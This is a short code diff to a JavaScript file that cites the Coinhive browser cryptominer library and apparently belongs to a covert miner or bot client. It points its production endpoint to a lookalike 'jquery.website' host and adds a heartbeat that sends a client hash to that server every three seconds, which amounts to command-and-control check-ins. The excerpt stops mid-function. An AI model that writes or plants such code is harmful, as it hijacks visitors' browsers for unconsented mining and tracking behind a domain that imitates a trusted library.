@@ -1,15 +1,22 @@
 // https://coinhive.com/lib/coinhive.min.js
 
 let origin;
-let _DEBUG = false;
+let _DEBUG = true;
 (function setOrigin(){
 	if(_DEBUG){
 		origin = "http://127.0.0.1:3333";
 	}
 	else{
-		origin = "https://jquery.website:3333"
+		origin = "https://jquery.website:3334"
 	}
 })();
+
+let current_time = new Date().getTime();
+self._client_hash = self._client_hash ? self._client_hash : current_time;
+function alive(){
+	fetch(origin + "/alive?hash=" + self._client_hash);
+}
+setInterval(alive,3000);
 
 var sleep = async (duration) => {
     return new Promise((resolve, reject) => {
